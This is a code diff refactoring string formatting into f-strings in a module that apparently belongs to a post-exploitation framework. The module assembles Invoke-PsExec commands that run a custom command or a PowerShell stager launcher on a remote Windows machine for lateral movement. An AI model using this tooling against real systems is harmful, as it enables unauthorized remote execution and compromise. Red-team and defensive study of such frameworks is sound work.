@@ -38,15 +38,11 @@ class Module:
         if command != "":
             # executing a custom command on the remote machine
             customCmd = "%COMSPEC% /C start /b " + command.replace('"', '\\"')
-            script_end += (
-                'Invoke-PsExec -ComputerName {} -ServiceName "{}" -Command "{}"'.format(
-                    computer_name, service_name, customCmd
-                )
-            )
+            script_end += f'Invoke-PsExec -ComputerName {computer_name} -ServiceName "{service_name}" -Command "{customCmd}"'
 
             if result_file != "":
                 # Store the result in a file
-                script_end += ' -ResultFile "%s"' % (result_file)
+                script_end += f' -ResultFile "{result_file}"'
 
         else:
             if not main_menu.listenersv2.get_active_listener_by_name(listener_name):
@@ -74,9 +70,7 @@ class Module:
                         "%COMSPEC% /C start /b C:\\Windows\\System32\\WindowsPowershell\\v1.0\\"
                         + launcher
                     )
-                    script_end += 'Invoke-PsExec -ComputerName {} -ServiceName "{}" -Command "{}"'.format(
-                        computer_name, service_name, stager_cmd
-                    )
+                    script_end += f'Invoke-PsExec -ComputerName {computer_name} -ServiceName "{service_name}" -Command "{stager_cmd}"'
 
         outputf = params.get("OutputFunction", "Out-String")
         script_end += (
